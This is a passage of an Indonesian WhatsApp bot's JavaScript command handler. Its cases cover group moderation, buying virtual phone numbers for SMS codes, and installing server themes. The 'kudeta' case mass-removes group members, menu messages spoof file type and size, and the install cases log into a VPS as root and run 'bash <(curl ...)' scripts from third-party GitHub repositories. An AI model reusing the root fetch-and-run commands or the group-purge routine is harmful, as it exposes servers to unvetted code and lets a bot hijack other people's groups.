break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await ZakzzDev.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await ZakzzDev.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "outgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await ZakzzDev.groupLeave(m.chat)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await ZakzzDev.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await ZakzzDev.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "linkgc": case "gc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await ZakzzDev.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await ZakzzDev.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await ZakzzDev.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await ZakzzDev.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "joinch": case "joinchannel": {
    if (!isCreator) return Reply(mess.owner);
    if (!text && !m.quoted) return m.reply(example("linkchnya"));
    if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/"))
        return m.reply("Link tautan tidak valid");

    let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1];
    let res = await ZakzzDev.newsletterMetadata("invite", result);
    await ZakzzDev.newsletterFollow(res.id);

    m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antipromosi": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    const teks = `
📢 *Antipromosi Group Protection*

Fitur ini akan mendeteksi & menghapus pesan promosi seperti:
"jual", "beli", "promo", "diskon", "cek bio", dll.

━━━━━━━━━━━━━━━━
ぃ .antipromosi-on
ぃ .antipromosi-off
`;

    await ZakzzDev.sendMessage(m.chat, {
        footer: `⨢ Proteksi grup aktif untuk pesan promosi`,
        buttons: [{
            buttonId: '.antipromosi-on',
            buttonText: { displayText: 'Aktifkan Antipromosi ✅' },
            type: 1
        }, {
            buttonId: '.antipromosi-off',
            buttonText: { displayText: 'Nonaktifkan Antipromosi ❌' },
            type: 1
        }],
        headerType: 1,
        viewOnce: true,
        document: fs.readFileSync("./package.json"),
        fileName: `✪ 𝗔𝗹𝘄𝗮𝘆𝘀𝗭𝗮𝗸𝘇𝘇 ✪`,
        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        fileLength: 99999999,
        caption: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                title: `${botname}`,
                body: `📢 Pengaturan Antipromosi Grup`,
                mediaType: 1,
                thumbnailUrl: 'https://files.catbox.moe/5z3rdw.jpg',
                sourceUrl: 'https://www.whatsapp.com/security/',
                renderLargerThumbnail: false
            }
        }
    });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antipromosi-off": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    if (global.db.groups[m.chat].antipromosi === false)
        return Reply(`*Antipromosi* di grup ini sudah nonaktif!`);

    global.db.groups[m.chat].antipromosi = false;
    return Reply("✅ Berhasil mematikan *Antipromosi* di grup ini");
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antipromosi-on": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    if (global.db.groups[m.chat].antipromosi === true)
        return Reply(`*Antipromosi* di grup ini sudah aktif!`);

    global.db.groups[m.chat].antipromosi = true;
    return Reply("✅ Berhasil menyalakan *Antipromosi* di grup ini");
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antilink": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    const antilinkOptions = [
        { title: ".antilink-on", id: ".antilink-on" },
        { title: ".antilink-off", id: ".antilink-off" }
    ];

    let teks = `
🔗 *Antilink Group Protection*

Silakan pilih untuk *mengaktifkan* atau *menonaktifkan* fitur antilink grup.
━━━━━━━━━━━━━━━━
ぃ .antilink-on
ぃ .antilink-off
`;

    await ZakzzDev.sendMessage(m.chat, {
        footer: `⨢ Proteksi grup aktif untuk link berbahaya`,
        buttons: [{
            buttonId: '.antilink-on',
            buttonText: { displayText: 'Aktifkan Antilink ✅' },
            type: 1
        }, {
            buttonId: '.antilink-off',
            buttonText: { displayText: 'Nonaktifkan Antilink ❌' },
            type: 1
        }],
        headerType: 1,
        viewOnce: true,
        document: fs.readFileSync("./package.json"),
        fileName: `✪ 𝗔𝗹𝘄𝗮𝘆𝘀𝗭𝗮𝗸𝘇𝘇 ✪`,
        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        fileLength: 99999999,
        caption: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                title: `${botname}`,
                body: `🔗 Pengaturan Antilink Grup`,
                mediaType: 1,
                thumbnailUrl: 'https://files.catbox.moe/q4tj96.jpg',
                sourceUrl: 'https://www.whatsapp.com/security/',
                renderLargerThumbnail: false
            }
        }
    });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antilink-on": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    if (global.db.groups[m.chat].antilink == true) 
        return Reply(`*Antilink* di grup ini sudah aktif!`);

    global.db.groups[m.chat].antilink = true;
    return Reply("✅ Berhasil menyalakan *Antilink* di grup ini");
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antilink-off": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    if (global.db.groups[m.chat].antilink == false) 
        return Reply(`*Antilink* di grup ini tidak aktif!`);

    global.db.groups[m.chat].antilink = false;
    return Reply("❌ Berhasil mematikan *Antilink* di grup ini");
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antilink2": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    const antilink2Options = [
        { title: ".antilink2-on", id: ".antilink2-on" },
        { title: ".antilink2-off", id: ".antilink2-off" }
    ];

    let teks = `
🧷 *Antilink2 Group System*

Silakan pilih untuk *mengaktifkan* atau *menonaktifkan* fitur *Antilink2* lanjutan.
━━━━━━━━━━━━━━━━
ぃ .antilink2-on
ぃ .antilink2-off
`;

    await ZakzzDev.sendMessage(m.chat, {
        footer: `⨢ Proteksi tambahan terhadap spam link`,
        buttons: [{
            buttonId: '.antilink2-on',
            buttonText: { displayText: 'Aktifkan Antilink2 ✅' },
            type: 1
        }, {
            buttonId: '.antilink2-off',
            buttonText: { displayText: 'Nonaktifkan Antilink2 ❌' },
            type: 1
        }],
        headerType: 1,
        viewOnce: true,
        document: fs.readFileSync("./package.json"),
        fileName: `✪ 𝗔𝗹𝘄𝗮𝘆𝘀𝗭𝗮𝗸𝘇𝘇 ✪`,
        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        fileLength: 99999999,
        caption: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                title: `${botname}`,
                body: `🧷 Antilink2 – Proteksi lanjutan`,
                mediaType: 1,
                thumbnailUrl: 'https://files.catbox.moe/q4tj96.jpg',
                sourceUrl: 'https://www.whatsapp.com/security/',
                renderLargerThumbnail: false
            }
        }
    });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antilink2-on": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    if (global.db.groups[m.chat].antilink2 == true) return Reply(`*Antilink2* sudah aktif!`);
    if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false;
    
    global.db.groups[m.chat].antilink2 = true;
    return Reply("✅Berhasil menyalakan *Antilink2* di grup ini");
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "antilink2-off": {
    if (!m.isGroup) return Reply(mess.group);
    if (!isCreator) return Reply(mess.owner);

    if (global.db.groups[m.chat].antilink2 == false) return Reply(`*Antilink2* tidak aktif!`);

    global.db.groups[m.chat].antilink2 = false;
    return Reply("Berhasil mematikan *Antilink2* di grup ini");
}
break

//==========𝐀𝐚𝐧𝐳𝐂𝐮𝐲𝐱𝐳𝐳𝐳==========//
case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return Reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return Reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return Reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return Reply("Berhasil mematikan *mute* di grup ini")
} else return Reply(example("on/off"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "blacklist": case "blacklistjpm": case "bljpm": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "blacklistalljpm": case "bljpmall": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(example("on/off"))
  let teks = text.toLowerCase()

  let total = 0
  for (let id in global.db.groups) {
    if (teks == "on") {
      if (!global.db.groups[id].blacklistjpm) {
        global.db.groups[id].blacklistjpm = true
        total++
      }
    } else if (teks == "off") {
      if (global.db.groups[id].blacklistjpm) {
        global.db.groups[id].blacklistjpm = false
        total++
      }
    } else return m.reply(example("on/off"))
  }

  m.reply(`Berhasil ${teks == "on" ? "menyalakan" : "mematikan"} *blacklistjpm* di ${total} grup`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await ZakzzDev.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await ZakzzDev.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Berhasil Mengeluarkan Anak sampah ✅")
for (let i of memberFilter) {
await ZakzzDev.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await ZakzzDev.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await ZakzzDev.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listnokos":
{
 let teksnya = `
Haii @${m.sender.split("@")[0]}, Silahkan Pilih Layanan Nokos Yang Tersedia Di Bawah
━━━━━━━━━━━━━━━━
ぃ .ubahstatus 
ぃ .statussms  
ぃ .cekpesanan 
 `;

 // Menyiapkan daftar layanan ke dalam tombol
 let layananRows = global.nokosvirtusim.map(layanan => ({
   title: layanan.nama,
   id: `.ordernokos ${layanan.id}`
 }));

 await ZakzzDev.sendMessage(m.chat, {
   footer: `© 2025 ${botname}`,
   buttons: [{
     buttonId: 'action',
     buttonText: { displayText: 'Pilih Layanan' },
     type: 4,
     nativeFlowInfo: {
       name: 'single_select',
       paramsJson: JSON.stringify({
         title: 'ʟᴀʏᴀɴᴀɴ ᴛᴇʀsᴇᴅɪᴀ',
         sections: [
           {
             title: 'ʟᴀʏᴀɴᴀɴ',
             highlight_label: 'ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ',
             rows: layananRows
           }
         ]
       })
     }
   }],
   headerType: 1,
   viewOnce: true,
   document: fs.readFileSync("./package.json"),
   fileName: `By ${namaOwner} </>`,
   mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
   fileLength: 99999999,
   caption: teksnya,
   contextInfo: {
     isForwarded: true,
     mentionedJid: [m.sender],
     forwardedNewsletterMessageInfo: {
       newsletterJid: global.idSaluran,
       newsletterName: global.namaSaluran
     },
     externalAdReply: {
       title: `${botname}`,
       body: `♨️ ${runtime(process.uptime())}`,
       mediaType: 1,
       thumbnailUrl: 'https://files.catbox.moe/wwqoxw.jpg', // Bebas ganti mau pake foto apa saja yang penting url!!
       sourceUrl: linkSaluran,
       renderLargerThumbnail: false 
     }
   }
 });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "buynokos": {
    try {
        if (m.isGroup) return Reply("❌ Pembelian hanya bisa dilakukan di private chat!");
        if (db.users[m.sender]?.status_deposit) return Reply("⚠️ Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

        if (!args[0]) {
            return Reply("❌ Format salah!\nGunakan: *ordernokos <ID_SERVICE>*");
        }

        const serviceId = args[0].trim();
        const layanan = global.layananVirtuSIM.find(l => l.id == serviceId);
        if (!layanan) return Reply("❌ ID Layanan tidak ditemukan. Cek daftar layanan yang tersedia.");

        const hargaAsli = Number(layanan.harga);
        const pajakAdmin = global.pajakAdmin || 10;
        const totalHarga = Math.ceil(hargaAsli * (1 + pajakAdmin / 100));
        const amount = totalHarga + generateRandomNumber(110, 250);
        const UrlQr = global.qrisOrderKuota;

        const { data } = await axios.get(`https://aanz-official.my.id/api/orkut/createpayment?apikey=${global.ZakzzDev}&amount=${amount}&codeqr=${UrlQr}`);
        if (!data || !data.result) return Reply("❌ Gagal membuat QRIS pembayaran. Coba lagi nanti.");

        const pembayaran = data.result;
        const teks3 = `
*📌 INFORMASI PEMBAYARAN*

🆔 *ID Transaksi:* ${pembayaran.transactionId}
💰 *Total Pembayaran:* Rp${await toIDR(pembayaran.amount)}
📦 *Barang:* ${layanan.nama}
⏳ *Expired:* 5 menit

⚠️ QRIS hanya berlaku selama 5 menit. Jika pembayaran berhasil, pesanan akan otomatis diproses.

Ketik *.batalbeli* untuk membatalkan transaksi ini.
`;

        let msgQr = await ZakzzDev.sendMessage(m.chat, {
            footer: `© 2025 ${botname}`,
            buttons: [
                { buttonId: `.batalbeli`, buttonText: { displayText: 'Batalkan Pembelian' }, type: 1 }
            ],
            headerType: 1,
            viewOnce: true,
            image: { url: pembayaran.qrImageUrl },
            caption: teks3,
            contextInfo: { mentionedJid: [m.sender] },
        });

        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: pembayaran.transactionId,
            amount: pembayaran.amount.toString(),
            service: serviceId
        };

        // TIMER EXPIRED (TIDAK DISIMPAN DI DATABASE)
        let timeout = setTimeout(async () => {
            if (db.users[m.sender].status_deposit) {
                await ZakzzDev.sendMessage(m.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: msgQr });
                await ZakzzDev.sendMessage(m.chat, { delete: msgQr.key });
                db.users[m.sender].status_deposit = false;
                delete db.users[m.sender].saweria;
            }
        }, 300000);

        while (db.users[m.sender].status_deposit) {
            await sleep(8000);
            const resultcek = await axios.get(`https://aanz-official.my.id/api/orkut/cekstatus?apikey=${global.ZakzzDev}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            const req = resultcek.data;

            if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
                db.users[m.sender].status_deposit = false;
                clearTimeout(timeout);

                await ZakzzDev.sendMessage(m.chat, { text: `
✅ *PEMBAYARAN BERHASIL DITERIMA*

🆔 *ID :* ${db.users[m.sender].saweria.idDeposit}
💰 *Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
📦 *Barang :* ${layanan.nama}
`}, { quoted: msgQr });

                // **🛒 Proses Pemesanan ke VirtuSIM**
                let apiUrl = `https://virtusim.com/api/json.php?api_key=${global.apivirtu}&action=order&service=${serviceId}&operator=any`;
                let response = await fetch(apiUrl);
                let result = await response.json();

                console.log("🔥 Debug API Response:", result); // Tambahkan ini untuk melihat respons di console log

                if (!result || !result.status || !result.data) {
                    return Reply("❌ Gagal melakukan pemesanan. Coba lagi nanti.");
                }

                let message = `✅ *Order Berhasil!*\n\n`;
                message += `🆔 *ID Order:* ${result.data.id}\n`;
                message += `📌 *Layanan:* ${result.data.service_name}\n`;
                message += `📞 *Nomor:* ${result.data.number}\n`;
                message += `⏳ *Status:* Ready`;

                await ZakzzDev.sendMessage(m.chat, { text: message }, { quoted: msgQr });

                // **Hapus Data Transaksi Setelah Selesai**
                await ZakzzDev.sendMessage(m.chat, { delete: msgQr.key });
                delete db.users[m.sender].saweria;
            }
        }
    } catch (error) {
        console.error("❌ Error dalam case ordernokos:", error.message);
        Reply("❌ Terjadi kesalahan dalam proses permintaan.");
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ubahstatus": {
 try {
 if (!args[0] || !args[1]) {
 Reply("❌ Format salah!\nGunakan: *ubahstatus IDORDER STATUS*\n\n📌 *Status yang tersedia:*\n1 - Ready ✅\n2 - Cancel ❌\n3 - Resend 🔄\n4 - Selesai 🎉");
 break;
 }

 let orderId = args[0]; 
 let status = args[1]; 

 if (!["1", "2", "3", "4"].includes(status)) {
 Reply("❌ Status tidak valid! Gunakan:\n1 - Ready ✅\n2 - Cancel ❌\n3 - Resend 🔄\n4 - Selesai 🎉");
 break;
 }

 let apiUrl = `https://virtusim.com/api/json.php?api_key=${global.apivirtu}&action=set_status&id=${orderId}&status=${status}`;
 
 let response = await fetch(apiUrl);
 let result = await response.json();

 console.log(result); 

 if (!result || !result.status) {
 Reply(`❌ Gagal mengubah status order *${orderId}*. Coba lagi nanti.`);
 break;
 }

 let statusText = 
 status === "1" ? "✅ Ready" :
 status === "2" ? "❌ Cancel" :
 status === "3" ? "🔄 Resend" :
 "🎉 Selesai";

 Reply(`✅ *Status Order Berhasil Diubah!*\n\n🆔 ID Order: ${orderId}\n📌 Status Baru: ${statusText}`);
 } catch (error) {
 console.error("Error:", error);
 Reply("❌ Terjadi kesalahan dalam mengubah status order.");
 }
}
break
 
//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "statussms": {
 try {
 let apiUrl = `https://virtusim.com/api/json.php?api_key=${global.apivirtu}&action=active_order`;
 
 let response = await fetch(apiUrl);
 let result = await response.json();

 console.log(result); 

 if (!result || !result.status || !result.data || result.data.length === 0) {
 Reply("❌ Tidak ada SMS yang tersedia saat ini.");
 break;
 }

 let message = "📩 *Daftar SMS Aktif*\n\n";
 result.data.forEach((order, index) => {
 message += `*${index + 1}. ${order.service}*\n`;
 message += `📞 Nomor: ${order.number}\n`;
 message += `📩 Kode SMS: ${order.sms || "Belum diterima"}\n`;
 message += `🆔 ID Order: ${order.id}\n\n`;
 });

 Reply(message);
 } catch (error) {
 console.error("Error:", error);
 Reply("❌ Terjadi kesalahan dalam mengambil status SMS.");
 }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cekpesanan": {
 try {
 if (!args[0]) {
 Reply("❌ Format salah!\nGunakan: *cekpesanan IDORDER*");
 break;
 }

 let orderId = args[0]; 
 let apiUrl = `https://virtusim.com/api/json.php?api_key=${global.apivirtu}&action=status&id=${orderId}`;
 
 let response = await fetch(apiUrl);
 let result = await response.json();

 console.log(result); 

 if (!result || !result.status || !result.data) {
 Reply(`❌ Order dengan ID *${orderId}* tidak ditemukan.`);
 break;
 }

 let order = result.data;
 let statusText = 
 order.status === "1" ? "✅ Ready" :
 order.status === "2" ? "❌ Canceled" :
 order.status === "3" ? "🔄 Resend" :
 order.status === "4" ? "🎉 Selesai" :
 "⏳ Pending";

 let message = `📦 *Status Pesanan*\n\n`;
 message += `🆔 ID Order: ${order.id}\n`;
 message += `📞 Nomor: ${order.number || "Belum tersedia"}\n`;
 message += `📌 Layanan: ${order.service}\n`;
 message += `📩 Kode SMS: ${order.sms || "Belum diterima"}\n`;
 message += `⏳ Status: ${statusText}`;

 Reply(message);
 } catch (error) {
 console.error("Error:", error);
 Reply("❌ Terjadi kesalahan dalam mengecek pesanan.");
 }
}
 break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "installplugin": {
    if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await m.reply("Berhasil install Depend silakan ketik .installnebula ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('11\n');
                stream.write('A\n');
                stream.write('Y\n');
                stream.write('Y\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "installtemanightcore": case "installtemanightcore": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nightcore* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('1\n');
stream.write('y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "installtemaelysium": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema Elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
 stream.write('1\n');
stream.write('y\n');
stream.write('yes\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
